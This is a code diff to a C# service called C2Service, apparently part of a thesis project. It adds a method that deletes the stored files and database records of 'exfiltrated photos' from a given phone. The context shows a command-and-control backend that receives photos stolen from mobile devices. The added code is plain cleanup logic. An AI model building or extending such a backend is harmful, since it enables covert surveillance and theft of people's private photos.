@@ -153,6 +153,48 @@ namespace tesis.Services
                 .OrderByDescending(p => p.CapturedAt) // Las más nuevas primero
                 .ToListAsync();
         }
+
+        // ... dentro de C2Service.cs
+
+        // 6. Eliminar todas las fotos de un dispositivo (Borrado Físico + BD)
+        public async Task<bool> DeleteAllPhotosAsync(string deviceId)
+        {
+            // 1. Buscar todas las fotos de ese celular
+            var photos = await _context.ExfiltratedPhotos
+                .Where(p => p.DeviceId == deviceId)
+                .ToListAsync();
+
+            if (!photos.Any()) return false; // No hay nada que borrar
+
+            // 2. Borrar archivos físicos del disco (wwwroot/uploads)
+            foreach (var photo in photos)
+            {
+                try
+                {
+                    // photo.FilePath viene como "/uploads/nombre.jpg"
+                    // Necesitamos la ruta física: C:\...\wwwroot\uploads\nombre.jpg
+                    var webRoot = _environment.WebRootPath;
+                    var relativePath = photo.FilePath.TrimStart('/').Replace("/", "\\"); // Ajuste para Windows
+                    var fullPath = Path.Combine(webRoot, relativePath);
+
+                    if (System.IO.File.Exists(fullPath))
+                    {
+                        System.IO.File.Delete(fullPath);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    // Si falla borrar un archivo, seguimos con el siguiente (no rompemos el flujo)
+                    Console.WriteLine($"Error borrando archivo: {ex.Message}");
+                }
+            }
+
+            // 3. Borrar registros de la Base de Datos
+            _context.ExfiltratedPhotos.RemoveRange(photos);
+            await _context.SaveChangesAsync();
+
+            return true;
+        }
         // 4. Guardar Foto Exfiltrada (La parte crítica)
         public async Task<bool> SaveExfiltratedPhotoAsync(string deviceId, IFormFile file)
         {
